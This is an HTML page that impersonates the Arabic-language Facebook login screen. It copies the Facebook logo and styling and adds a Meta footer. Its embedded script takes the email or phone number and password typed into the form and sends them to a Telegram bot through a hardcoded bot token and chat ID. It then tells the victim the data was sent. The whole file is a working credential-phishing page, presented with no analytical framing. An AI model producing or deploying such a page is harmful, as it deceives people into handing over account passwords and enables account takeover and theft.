<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تسجيل الدخول إلى فيسبوك</title>
  <style>
    body {
      margin: 0;
      background: #fff;
      font-family: Helvetica, Arial, sans-serif;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo img {
      width: 60px;
      height: auto;
      display: block;
      margin: 0 auto;
    }

    .form {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .form input {
      font-size: 16px;
      padding: 14px;
      border: 1px solid #dddfe2;
      border-radius: 8px;
    }

    .form input:focus {
      outline: none;
      border-color: #1877f2;
    }

    .login-btn {
      background: #1877f2;
      color: #fff;
      border: none;
      padding: 14px;
      border-radius: 8px;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
    }

    .login-btn:hover {
      background: #166fe5;
    }

    .forgot {
      text-align: center;
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }

    .create-account {
      background: #fff;
      color: #1877f2;
      border: 1px solid #1877f2;
      padding: 14px;
      border-radius: 8px;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
    }

    .create-account:hover {
      background: #f0f2f5;
    }

    footer {
      text-align: center;
      padding: 20px;
      font-size: 12px;
      color: #666;
    }

    .message {
      text-align: center;
      margin-top: 10px;
      font-size: 14px;
      display: none;
    }

  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    </div>
    <form class="form" id="loginForm">
      <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
      <input type="password" id="password" placeholder="كلمة السر" required>
      <button type="submit" class="login-btn">تسجيل الدخول</button>
      <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
      <button type="button" class="create-account">إنشاء حساب جديد</button>
    </form>
    <div id="message" class="message"></div>
  </div>
  <footer>
    <p>Meta © 2025</p>
  </footer>

  <script>
    const BOT_TOKEN = "7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E";
    const CHAT_ID = "6437823957";

    const form = document.getElementById('loginForm');
    const messageDiv = document.getElementById('message');

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const text = `🟦 [بيانات تسجيل دخول جديدة]\n📧 المستخدم: ${email}\n🔑 كلمة السر: ${password}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      })
      .then(response => response.json())
      .then(data => {
        messageDiv.innerText = "✅ تم الإرسال بنجاح!";
        messageDiv.style.display = "block";
        form.reset();
      })
      .catch(error => {
        messageDiv.innerText = "❌ حدث خطأ!";
        messageDiv.style.display = "block";
      });
    });
  </script>
</body>
</html>
